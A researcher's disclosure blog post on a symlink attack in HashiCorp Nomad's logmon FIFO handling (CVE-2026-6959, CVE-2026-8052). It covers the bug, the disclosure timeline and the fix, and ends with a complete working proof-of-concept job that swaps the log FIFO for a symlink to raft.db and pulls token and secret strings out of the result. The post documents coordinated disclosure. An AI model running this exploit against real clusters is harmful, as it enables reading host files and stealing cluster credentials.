---
layout: post
category: Security
title: "HashiCorp Nomad FIFO symlink attack (CVE-2026-6959, CVE-2026-8052)"
heading: "HashiCorp Nomad FIFO symlink attack (CVE-2026-6959, CVE-2026-8052)"
description: "CVE-2026-6959 and CVE-2026-8052 A task container can replace the FIFO used for log streaming with a symlink to any host file. When the task restarts, logmon follows the symlink and reads or writes the target as the Nomad process user."
---

## TLDR:

- HashiCorp Nomad and Nomad Enterprise from **0.9 through 2.0.0** are vulnerable to arbitrary file read and write on the client host as the Nomad process user. CVE-2026-6959, CWE-59, CNA score 6.0 (`CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:N/I:H/A:N`).
- The exec2 task driver prior to 0.1.2 has the same class of bug. CVE-2026-8052, CWE-59, CNA score 6.0.
- A task container can replace the FIFO used for stdout/stderr log streaming with a symlink to any file on the host. When the task restarts, logmon reopens the FIFO path, follows the symlink, and reads or writes the target as the Nomad process user.
- The root cause is in logmon, so any driver that bind-mounts `/alloc/logs` writable into the task is affected. Podman is just where I found it.
- The affected range starts at Nomad 0.9 — this surface had been present for years.
- **Upgrade Nomad to 2.0.1, 1.11.5, or 1.10.11. If you're using exec2, upgrade to 0.1.2.** The fix is a breaking change: `/alloc/logs` is now bind-mounted read-only for drivers with filesystem isolation.

---

## The surface

After the [Vitess work](/security/2026/05/18/RCE-and-arbitrary-file-write-in-Vitess-vtbackup-via-untrusted-MANIFEST-fields/), I kept pulling on infrastructure stuff and ended up spending time reading through Nomad's task driver code. I had a version of ttyd running so I could poke around from inside a deployed container. The podman driver was the most interesting thing I could see from that point, it bridges container and host, and the log streaming path has to open files on the host side based on paths the container can influence.

Nomad uses named pipes (FIFOs) for task log handling. The container and the Nomad agent share `/alloc/logs`. The agent opens those FIFOs to collect stdout/stderr from the running task. Two lines in the podman driver code matter here:

- `driver.go#L1564` calls `runLogStreaming` on every task restart.
- `handle.go#L151` is where the FIFO actually gets opened, without `O_NOFOLLOW`.
## The bug

1. Task is running. FIFO exists at `/alloc/logs/.sidecar.stdout.fifo`.
2. Container `unlink`s the FIFO and replaces it with a symlink pointing at a host file.
3. Task restarts, naturally or because it crashes.
4. logmon reopens the FIFO path on the host side, follows the symlink, and is now reading from or writing to whatever the symlink points at. As the Nomad process user.

The PoC reads `/nomad/data/server/raft/raft.db` to show what this gets you on a real node. A `raw_exec` sidecar task sleeps 10 seconds and exits 1, triggering a restart on the configured delay. The attacker task (podman container) waits for the FIFO to appear, unlinks it, drops a symlink to `raft.db` in its place, then waits. When logmon reopens the path, it streams `raft.db` into the log file. The container reads it back from `/alloc/logs/sidecar.stdout`.

The `raw_exec` part is just for the PoC to have a deterministic restart cycle. You don't need a privileged driver in practice — most real allocations include sidecars that restart naturally. Log collectors, anything with a restart policy, is a trigger.

(HashiCorp scored this `C:N/I:H/A:N`, so they treated it as a write primitive only. The PoC does read `raft.db`, but only by getting the host to write it into the alloc log file, which is a stretch of the read primitive. Fair enough.)

(Full PoC files in Appendix A.)

## Disclosure

I sent the report to security@hashicorp.com on April 11 with a docker-compose reproducer attached. This is where it got entertaining.... The email filter stripped the `.zip`. Then stripped the renamed `.txt` version. Then stripped a second `.txt` attempt. In the end I pasted all five files inline in the email body, with a "Lets hope this gets though :)" which I stand by.

James Warren at HashiCorp picked it up on April 14. Reproduction confirmed April 16. They were working to reproduce it with constrained tasks instead of `raw_exec`, which confirmed they understood the driver was just a convenient stand-in for "anything that restarts."

Then on May 8, James told me the same issue affects the exec2 task driver, which is released as a separate binary. That got CVE-2026-8052. The bulletin credits "the Nomad engineering team in conjunction with NeuroWinter" — they found that one. I hadn't looked at exec2 specifically. Two CVEs from one investigation, the second one turned up by HashiCorp themselves.

Both bulletins went public May 13.

## The fix

I'd suggested `O_NOFOLLOW` on the FIFO open in logmon. What shipped goes wider, in two layers ([commit 2a09fd6](https://github.com/hashicorp/nomad/commit/2a09fd62c23880ff306499ae03fe64628d82a23f)):

1. The FIFO creation path now uses Go's `os.Root` to confine filesystem operations to the logs directory, with a new `mkfifoat` syscall wrapper on Linux and BSD. That stops the symlink-following at the syscall layer. macOS is excluded because the syscall isn't available there. Windows doesn't need it because named pipes live in the kernel namespace, not the filesystem.
2. The allocation logs directory is now bind-mounted **read-only** for task drivers with filesystem isolation. That stops the container from `unlink`ing the FIFO in the first place. This is the breaking change called out in the release notes.

While they were in there, the team also patched another variant: a task could replace `/alloc/logs/` itself with a symlink, letting logmon create files in arbitrary host directories. I hadn't found that one — it came out of HashiCorp's audit after my report. Same root cause, different lever.

I've had a lot worse CVD experiences :)

---

## Timeline

- **11 April 2026:** Reported to security@hashicorp.com with PoC
- **14 April 2026:** HashiCorp picks up the report (after a round of email-filter wrangling)
- **16 April 2026:** Reproduction confirmed; fix targeted for Nomad 2.0.1
- **17 April 2026:** CVE-2026-6959 to be issued; fix scope expanded to logmon
- **8 May 2026:** HashiCorp finds same bug in exec2 driver; CVE-2026-8052 reserved
- **13 May 2026:** Both bulletins and CVEs published; Nomad 2.0.1, 1.11.5, 1.10.11, exec2 0.1.2 released

---

## Appendix A — PoC Files

**docker-compose.yml**

```yaml
services:
  consul:
    image: hashicorp/consul:latest
    ports:
      - "8500:8500"
    command: "agent -dev -bind=0.0.0.0 -client=0.0.0.0"
  nomad:
    build:
      context: .
      dockerfile: Dockerfile.nomad
    ports:
      - "4646:4646"
      - "4647:4647"
      - "4648:4648"
    volumes:
      - ./nomad-config:/etc/nomad.d
      - nomad-data:/nomad/data
      - /sys/fs/cgroup:/sys/fs/cgroup:rw
    privileged: true
    cgroup: host
    devices:
      - /dev/fuse:/dev/fuse
    security_opt:
      - seccomp=unconfined
      - apparmor=unconfined
    environment:
      - NOMAD_ADDR=http://0.0.0.0:4646
    depends_on:
      - consul
volumes:
  nomad-data:
```

**Dockerfile.nomad**

```dockerfile
FROM ubuntu:24.04
ARG NOMAD_VERSION=1.9.7
ARG PODMAN_DRIVER_VERSION=0.6.3
RUN apt-get update && apt-get install -y \
    curl \
    unzip \
    podman \
    uidmap \
    fuse-overlayfs \
    slirp4netns \
    ca-certificates \
    iproute2 \
    && rm -rf /var/lib/apt/lists/*
RUN curl -fsSL https://releases.hashicorp.com/nomad/${NOMAD_VERSION}/nomad_${NOMAD_VERSION}_linux_amd64.zip \
    -o /tmp/nomad.zip \
    && unzip /tmp/nomad.zip -d /usr/local/bin/ \
    && rm /tmp/nomad.zip
RUN mkdir -p /opt/nomad/plugins \
    && curl -fsSL https://releases.hashicorp.com/nomad-driver-podman/${PODMAN_DRIVER_VERSION}/nomad-driver-podman_${PODMAN_DRIVER_VERSION}_linux_amd64.zip \
    -o /tmp/podman-driver.zip \
    && unzip /tmp/podman-driver.zip -d /opt/nomad/plugins/ \
    && chmod +x /opt/nomad/plugins/nomad-driver-podman \
    && rm /tmp/podman-driver.zip
RUN useradd -m -u 1001 nomad \
    && echo "nomad:100000:65536" >> /etc/subuid \
    && echo "nomad:100000:65536" >> /etc/subgid
RUN mkdir -p /nomad/data /etc/nomad.d \
    && chown -R nomad:nomad /nomad
EXPOSE 4646 4647 4648
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
CMD ["/entrypoint.sh"]
```

**entrypoint.sh**

```bash
#!/bin/bash
mkdir -p /run/user/1001/podman
chown -R nomad:nomad /run/user/1001
mkdir -p /home/nomad/.config/containers
cat <<EOF > /home/nomad/.config/containers/containers.conf
[containers]
log_driver = "k8s-file"
[engine]
cgroup_manager = "cgroupfs"
EOF
mkdir -p /nomad/data
chown -R nomad:nomad /nomad/data /home/nomad
su - nomad -c "podman system service --time=0 unix:///run/user/1001/podman/podman.sock &"
sleep 2
exec su -s /bin/bash nomad -c "nomad agent -config=/etc/nomad.d"
```

**poc.nomad**

```hcl
job "poc" {
  datacenters = ["dc1"]
  type        = "service"
  group "app" {
    restart {
      attempts = 10
      interval = "10m"
      delay    = "5s"
      mode     = "delay"
    }
    task "sidecar" {
      driver = "raw_exec"
      config {
        command = "/bin/sh"
        args    = ["-c", "sleep 10; exit 1"]
      }
      resources {
        cpu    = 100
        memory = 64
      }
    }
    task "attacker" {
      driver = "podman"
      config {
        image   = "python:3.13-slim"
        command = "python3"
        args    = ["/local/poc.py"]
      }
      template {
        data        = <<EOF
import os
import time
import sys
import re
ALLOC_LOGS = "/alloc/logs"
TARGET = "/nomad/data/server/raft/raft.db"
fifo = os.path.join(ALLOC_LOGS, ".sidecar.stdout.fifo")
print(f"waiting for {fifo}", flush=True)
for i in range(30):
    if os.path.exists(fifo):
        print("found fifo", flush=True)
        break
    time.sleep(1)
try:
    os.unlink(fifo)
    os.symlink(TARGET, fifo)
    print("symlink planted", file=sys.stderr, flush=True)
except Exception as e:
    print(f"error: {e}", file=sys.stderr, flush=True)
# Wait for sidecar to restart and logmon to write raft.db into the log file
time.sleep(30)
# Read back the exfiltrated data
print("=== EXFILTRATED DATA ===", flush=True)
for logfile in sorted(os.listdir(ALLOC_LOGS)):
    if logfile.startswith("sidecar.stdout"):
        path = os.path.join(ALLOC_LOGS, logfile)
        print(f"\n--- {path} ---", flush=True)
        with open(path, "rb") as f:
            data = f.read()
        # Extract printable strings of length 8+
        strings = re.findall(rb'[\x20-\x7e]{8,}', data)
        for s in strings:
            decoded = s.decode("utf-8", errors="ignore")
            # Filter for interesting patterns
            if any(x in decoded for x in [
                "-", "nomad", "alloc", "secret", "token",
                "node", "eval", "job", "SecretID", "AuthToken",
                "dc1", "global", "192.168"
            ]):
                print(decoded, flush=True)
print("=== END EXFIL ===", flush=True)
time.sleep(30)
EOF
        destination = "local/poc.py"
      }
      resources {
        cpu    = 100
        memory = 128
      }
    }
  }
}
```

**nomad-config/nomad.hcl**

```hcl
data_dir  = "/nomad/data"
bind_addr = "0.0.0.0"
plugin_dir = "/opt/nomad/plugins"
log_level = "DEBUG"
server {
  enabled          = true
  bootstrap_expect = 1
}
client {
  enabled = true
}
consul {
  address = "consul:8500"
}
plugin "nomad-driver-podman" {
  config {
    socket_path    = "unix:///run/user/1001/podman/podman.sock"
    recover_stopped = true
  }
}
plugin "raw_exec" {
  config {
    enabled = true
  }
}
```

---

## Relevant Resources

- [HCSEC-2026-13: Nomad exec2 task driver vulnerable to arbitrary file read/write via symlink attack](https://discuss.hashicorp.com/t/hcsec-2026-13-nomads-exec2-task-driver-vulnerable-to-arbitrary-file-read-write-on-client-host-through-symlink-attack/77415)
- [HCSEC-2026-14: Nomad arbitrary file read/write on client host via symlink attack](https://discuss.hashicorp.com/t/hcsec-2026-14-nomad-arbitrary-file-read-write-on-client-host-through-symlink-attack/77416)
- [Nomad 2.0.1 release notes](https://github.com/hashicorp/nomad/releases/tag/v2.0.1)
- [Fix commit 2a09fd6](https://github.com/hashicorp/nomad/commit/2a09fd62c23880ff306499ae03fe64628d82a23f)

